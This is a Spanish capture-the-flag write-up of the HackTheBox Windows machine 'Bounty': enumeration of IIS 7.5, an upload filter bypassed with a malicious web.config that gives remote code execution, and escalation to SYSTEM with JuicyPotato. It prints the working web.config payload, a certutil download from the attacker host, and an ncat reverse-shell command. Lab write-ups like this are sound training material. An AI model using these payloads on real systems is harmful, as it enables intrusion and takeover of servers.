---
description: https://app.hackthebox.com/machines/Bounty
icon: windows
tags:
  - iis
  - seimpersonateprivilege
---

# Bounty

## Resumen

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Bounty        |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 26/10/2026    |
| **IP Objetivo**       | 10.129.90.156 |

### Executive Summary

La máquina **Bounty** expone solo **IIS 7.5 en el puerto 80**, y la enumeración revela `transfer.aspx` y `/uploadedfiles`. El formulario permite subir `.config`, lo que permite cargar un `web.config` malicioso y obtener **RCE** como `merlin`. Tras el foothold, se abusa de **`SeImpersonatePrivilege`** con **JuicyPotato** para suplantar a **`NT AUTHORITY\SYSTEM`** y comprometer la máquina por completo. Impacto **crítico**.

### Técnicas

* IIS Enumeration
* IIS Exploitation - Executing code through web.config file upload
* Abusing SeImpersonatePrivilege - Juicy Potato \[Privilege Escalation]

## Information Gathering

### Port Scanning

```bash
> nmap -p- -Pn -n -vv -oG allPorts 10.129.90.156
> nmap -Pn -sVC --open -oG allServices -p80 10.129.90.156 -vv
```

| Puerto | Servicio | Versión                 | Notas |
| ------ | -------- | ----------------------- | ----- |
| 80/tcp | http     | Microsoft IIS httpd 7.5 |       |

### Enumeration

**Web (IIS)**

Se utilizó la siguiente técnica para enumerar archivos `.aspx`, pero también se mostrará después otra técnica especializada para IIS.

{% hint style="info" %}
**Técnica utilizada:** Fuzzing de directorios y archivos simple con `FFUF`.
{% endhint %}

```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://10.129.90.156/FUZZ"
```

```
aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 51ms]
uploadedfiles           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 50ms]
```

```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://10.129.90.156/FUZZ.aspx"
```

```
transfer                [Status: 200, Size: 941, Words: 89, Lines: 22, Duration: 163ms]
```

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

`Se revela el archivo transfer.aspx`

{% hint style="info" %}
**Técnica especializada:** **IIS Tilde Enumeration** mediante el script [lijiejie/IIS\_shortname\_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner).
{% endhint %}

```bash
> git clone https://github.com/lijiejie/IIS_shortname_Scanner
> python3 iis_shortname_scan.py http://10.129.90.156
```

```
----------------------------------------------------------------
Dir:  /aspnet~1
Dir:  /upload~1
File: /csaspx~1.cs
File: /transf~1.asp*
----------------------------------------------------------------
```

`El output revela pistas (prefijos) de los directorios/archivos accesibles`

A partir de estas pistas, se pueden obtener todas las entradas de las wordlists de tu sistema con los prefijos obtenidos.

```bash
> egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

{% hint style="info" %}
En este caso no se ha utilizado esta técnica, pero está muy bien combinar ambas: lo que puede no recoger una, puede recogerlo o dar una pista la otra.
{% endhint %}

***

`transfer.aspx` contiene un formulario de subida de archivo.

Al subir un archivo se almacena en `/uploadedfiles/<filename>`, y se permite ver el archivo subido. No se permite subir archivos `aspx`, `asp` ni `jsp`.

Se procede a realizar fuzzing de extensiones de archivo permitidas, ya que se han intentado técnicas de evasión de filtros sin éxito.

```bash
ffuf -request crlf.txt -request-proto http -raw -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-extensions.txt -mr "File uploaded successfully"
```

```
 :: Method           : POST
 :: URL              : http://10.129.90.156/transfer.aspx
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-extensions.txt
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml
 :: Header           : Referer: http://10.129.90.156/transfer.aspx
 :: Header           : Content-Type: multipart/form-data; boundary=----geckoformboundary5f2108b379e67bb6a7ad8aaf46c000a
 :: Header           : Origin: http://10.129.90.156
 :: Header           : Connection: keep-alive
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Accept-Language: en-US,en;q=0.9
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : DNT: 1
 :: Header           : Priority: u=0, i
 :: Header           : Host: 10.129.90.156
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
 :: Data             : ------geckoformboundary5f2108b379e67bb6a7ad8aaf46c000a
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YRYCAgUPDxYGHgRUZXh0BR5JbnZhbGlkIEZpbGUuIFBsZWFzZSB0cnkgYWdhaW4eCUZvcmVDb2xvcgqNAR4EXyFTQgIEZGRksQZRpFSj84/wzHlKm1y8GvgHlJo=
------geckoformboundary5f2108b379e67bb6a7ad8aaf46c000a
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWAgKoq6qLCgLt3oXMA6ROZt9TCPPuIh5vv8UprbISM7SI
------geckoformboundary5f2108b379e67bb6a7ad8aaf46c000a
Content-Disposition: form-data; name="FileUpload1"; filename="shellxFUZZ"
Content-Type: application/octet-stream

....
------geckoformboundary5f2108b379e67bb6a7ad8aaf46c000a
Content-Disposition: form-data; name="btnUpload"

Upload
------geckoformboundary5f2108b379e67bb6a7ad8aaf46c000a--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: File uploaded successfully
 
.config                 [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 103ms]
.gif                    [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 110ms]
.png                    [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 111ms]
.doc                    [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 118ms]
.xls                    [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 119ms]
.jpeg                   [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 121ms]
.jpg                    [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 123ms]
.xlsx                   [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 55ms]
.docx                   [Status: 200, Size: 1110, Words: 92, Lines: 27, Duration: 62ms]
```

Se permite subir archivos: `.config`, `.gif`, `.png`, `.doc`, `.xls`, `.jpeg`, `.jpg`, `.xlsx`, `.docx`.

## Explotación

### Foothold

* **Vulnerabilidad:** IIS Web.config File Upload → RCE (CWE-434)
* **Exploit:** Subida de `web.config` malicioso que asocia `.config` al motor ASP en IIS, permitiendo ejecución de código.
* **Procedimiento:**

1. Se genera un payload, por ejemplo en revshells.com (`recomendado PowerShell Base64`).
2. Se carga un archivo con el siguiente contenido llamado `web.config`, reemplazando `<payload>` con el payload especificado.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
        </handlers>
        <security>
            <requestFiltering>
                <fileExtensions>
                    <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                    <remove segment="web.config" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
</configuration>
<!--
<%
Response.write("-"&"->")
' Reverse shell PowerShell en Base64 (evita problemas de comillas en XML/ASP)
Set oShell = CreateObject("WScript.Shell")
oShell.Run "<payload>", 0, False
Response.write("<!-"&"-")
%>
-->
```

3. Se pone un puerto en escucha para recibir la reverse shell.

```bash
> netcat -lvnp 9909
```

4. Se hace una petición a la URL `/uploadedfiles/web.config`.

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
**Evidencia: (user.txt)**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### Privesc

* **Vulnerabilidad:** Abuso de `SeImpersonatePrivilege` mediante JuicyPotato.
* **Procedimiento:**

1. Se descarga **JuicyPotato**, **ncat**, [**CLSID.list**](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/CLSID.list), [**CLSID.csv**](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/CLSID.csv) y [**test\_clsid.bat**](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (se comprime en local en un `.zip` para facilitar la descarga).

```powershell
PS C:\Users\merlin> certutil -urlcache -split -f http://10.10.15.78:9090/Ready.zip C:\Users\merlin\Ready.zip
```

2. Se ejecuta `test_clsid.bat` para obtener CLSID con privilegios SYSTEM, se espera a que termine y se revisa `result.log`.

```powershell
PS C:\Users\merlin> ./test_clsid.bat # Esperar a que termine
PS C:\Users\merlin> type result.log
```

\
La columna de la izquierda son los CLSIDs, y la columna de la derecha es la identidad de la sesión que podemos suplantar. Los que interesan son los `NT AUTHORITY\SYSTEM`, por ejemplo `{8BC3F05E-D86B-11D0-A075-00C04FB68820}`.

<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

3. Se pone el puerto `9009` en escucha en la máquina de atacante.

```bash
# Máquina atacante
> netcat -lvnp 9009
```

4. Se ejecuta JuicyPotato enviando un `cmd.exe` vía netcat a la máquina atacante.

```powershell
# Máquina víctima
PS C:\Users\merlin> ./JuicyPotato.exe -l 9091 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -p C:\Windows\System32\cmd.exe -a "/c C:\Users\merlin\ncat.exe 10.10.15.78 9009 -e C:\Windows\System32\cmd.exe" -t *
```

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
**Evidencia:** `root.txt`
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
